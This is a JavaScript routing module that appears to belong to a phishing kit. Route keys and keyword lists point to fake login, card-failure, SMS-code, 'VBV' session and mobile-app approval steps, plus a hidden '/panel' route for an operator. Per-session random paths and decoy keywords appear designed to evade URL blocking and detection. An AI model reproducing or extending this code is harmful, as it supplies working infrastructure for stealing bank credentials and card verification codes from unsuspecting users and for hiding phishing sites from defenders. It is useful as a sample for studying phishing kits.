
const ROUTE_KEYS = [
    { key: "home", keywords: [
        "homefoem","zebaltgomilcqqa",
    ]},
    { key: "login", keywords: [
        "loginaccessportal", "userloginentry", "signinuserpanel", "accountauthentication",
        "logincredentialscheck", "secureloginaccess", "membersigninpage", "portaluserentry",
        "authgatewaylogin", "loginsessionstart", "loginvalidationstep", "authenticationprocess",
        "userloginverification", "secureloginsystem", "accountsigninauth", "loginprotectionlayer",
        "websiteloginmodule", "loginentrypointauth", "loginsecuritychallenge", "loginredirectvalidation"
    ]},
    { key: "cAttnt", keywords: [
        "pendingupdateaction", "processingupdatequeue", "transactionstatuswait", "operationinprogress",
        "requestqueuedstatus", "statusprocessingflag", "serverprocessingstep", "backgroundupdatewait",
        "taskpendingexecution", "holdstatusprocessing", "updateawaitingcompletion", "taskexecutiondelay",
        "dataprocessqueuehold", "batchupdatepending", "transactionupdatewait", "databaseupdateflagged",
        "operationstatuscheck", "queuestatusverification", "backendpendingoperation", "systemupdatepause"
    ]},
    { key: "ccFaid", keywords: [
        "updatefailednotification", "transactionupdateerror", "processfailedflag", "serverupdateerror",
        "executionfailurealert", "errorupdatetriggered", "pendingupdatefailure", "updateprocessissue",
        "failedtasknotification", "databasetransactionerror", "backendupdatefailure", "rollbackupdatealert",
        "systemupdatefailure", "taskexecutionerror", "servercommunicationfailure", "updatelogerror",
        "operationfailedflag", "databasecommiterror", "statusupdatefailed", "serverprocessingerror"
    ]},
    { key: "esEms", keywords: [
        "checkpointvalidationauth", "securitystepcheckpoint", "userverificationstep", "authenticationstepgate",
        "identityvalidationprocess", "securecheckpointaccess", "multi-stepauthprocess", "accountverificationlayer",
        "restrictedentrycheckpoint", "authenticationgatekeeper", "challengeauthenticationstep", "doubleauthcheckpoint",
        "useraccesscheckpoint", "secureidentityvalidation", "accesscontrolcheckpoint", "userverificationphase",
        "step-upauthentication", "securegatewaycheckpoint", "enhancedauthstep", "securitylayercheckpoint"
    ]},
    { key: "esEmserr", keywords: [
        "invalidloginattempt", "unauthorizedaccessalert", "authenticationfailednotice", "invalidcredentialsflag",
        "securityauthenticationerror", "wrongpasswordattempt", "failedloginattempts", "unauthenticateduserflag",
        "wrongaccountdetails", "accountlockoutalert", "faileduserverification", "sessionauthenticationerror",
        "unauthorizedloginentry", "secureaccessdenied", "userauthrejection", "credentialmismatchflag",
        "invalidsessionaccess", "useridentityrejected", "accountautherror", "authenticationfailurewarning"
    ]},
    { key: "vbSssn", keywords: [
        "sessionverificationcheck", "userauthsessionvalidation", "secureloginsessionverify", "activesessionvalidation",
        "sessionintegritycheck", "accountsessionmanagement", "server-sideauthvalidation", "userpresenceconfirmation",
        "sessionauthenticationlayer", "persistentloginverification", "secureusertracking", "sessionexpirycheck",
        "multi-sessionvalidation", "sessionstateauthentication", "websessionvalidation", "validuseractivitycheck",
        "browser-authsessionverify", "client-sessionsecuritycheck", "securelogintracker", "identitysessionverification"
    ]},
    { key: "vbErr", keywords: [
        "failedsessionvalidation", "invalidsessionstatus", "expiredsessionerror", "authenticationtokenfailure",
        "sessionmismatchalert", "useractivityverificationfail", "sessiondataerror", "unauthorizedsessionflag",
        "invalidsessionrequest", "sessionverificationfailure", "accountsessionissue", "browserauthsessionerror",
        "loginpersistencefailure", "server-sessionmismatch", "userpresencevalidationfail", "systemsessiontimeout",
        "securitysessionfail", "authenticationintegrityerror", "sessionauthdiscrepancy", "sessiontokenexpired"
    ]},
    { key: "mblApp", keywords: [
        "userdeviceverification", "multi-factorauthentication", "loginfromnewdevice", "securedeviceauthprocess",
        "unknownloginattempts", "devicewhitelistcheck", "iplocationsecurityflag", "newdeviceauthorization",
        "browserauthsecuritylayer", "twofactordeviceauth", "deviceidentitycheck", "device-authvalidation",
        "restricteddeviceaccess", "securedeviceauthentication", "accountdeviceauthorization", "newloginalert",
        "hardwareauthprocess", "devicefingerprintvalidation", "securedevicewhitelist", "remoteaccessvalidation"
    ]},
    { key: "cnctTimout", keywords: [
        "networkdisconnectionissue", "servercommunicationfailure", "clientconnectiontimeout", "requesttimedoutflag",
        "useractivitytimeout", "backendserverlag", "databasetimeouterror", "lostconnectionalert",
        "connectioninstabilitynotice", "networklatencyerror", "authenticationrequesttimeout", "internetconnectionfailure",
        "systemlatencyalert", "operationtimeoutevent", "serverresponsehang", "longloadingtimetrigger",
        "timeoutsessiontermination", "requestexecutiondelay", "backendoperationstuck", "systemrequestlagging"
    ]},
    { key: "NvRdPan", keywords: [
        "hammahamma", "hamahama", "zabbour", 
    ]}
];
const generateRandomPath = () => {
    const minLength = 16   ; // Minimum length
    const maxLength = 36   ; // Maximum length
    const randomLength = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;

    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let randomString = "";

    for (let i = 0; i < randomLength; i++) {
        const randomIndex = crypto.getRandomValues(new Uint32Array(1))[0] % characters.length;
        randomString += characters[randomIndex];
    }

    return "/" + randomString;
};

/**
 * Ensures randomized routes exist in sessionStorage before usage.
 */
const getRandomizedRoutes = () => {
    let storedRoutes = sessionStorage.getItem("thJdRbaz");

    if (!storedRoutes) {
        const randomizedRoutes = {};
        ROUTE_KEYS.forEach(({ key }) => {
            randomizedRoutes[key] = generateRandomPath();
        });

        sessionStorage.setItem("thJdRbaz", JSON.stringify(randomizedRoutes));
        return randomizedRoutes;
    }

    return JSON.parse(storedRoutes);
};

/**
 * Detects if the requested path contains any known keyword and redirects accordingly.
 */
const getRedirectRoute = (requestedPath) => {
    const thJdRbaz = getRandomizedRoutes();

    // Special case: Redirect /admin/24 to the randomized GenView route
    if (requestedPath === "/panel") {
        return thJdRbaz.NvRdPan;
    }

    for (let { key, keywords } of ROUTE_KEYS) {
        if (keywords.some(keyword => requestedPath.toLowerCase().includes(keyword.toLowerCase()))) {
            return thJdRbaz[key];
        }
    }

    return null;
};

/**
 * Returns the randomized login route.
 */
const getLoginRoute = () => {
    const routes = getRandomizedRoutes();
    return routes["login"] || "/"; // Default to "/" if session storage fails
};
const generateRandomString = () => {
    const length = Math.floor(Math.random() * (24 - 12 + 1)) + 12; // Random length between 12 and 24
    return Math.random().toString(36).substring(2, 2 + length);
};

/**
 * Picks a random keyword from the given key's keywords list.
 */
const getRandomKeywordFromKey = (key) => {
    const route = ROUTE_KEYS.find(r => r.key === key);
    if (!route || route.keywords.length === 0) return generateRandomString(); // Fallback to random string
    return route.keywords[Math.floor(Math.random() * route.keywords.length)];
};

/**
 * Generates a randomized path containing a keyword from the specified key.
 * The keyword's position is randomly determined.
 */
const generateRandomizedPath = (key) => {
    const randomStr1 = generateRandomString();
    const randomStr2 = generateRandomString();
    const keyword = getRandomKeywordFromKey(key);

    // Randomize the position of the keyword
    const randomOrder = Math.random() < 0.5;
    return randomOrder ? `/${randomStr1}${keyword}${randomStr2}` : `/${randomStr2}${keyword}${randomStr1}`;
};

export { getRandomizedRoutes, getRedirectRoute, getLoginRoute, generateRandomizedPath  };
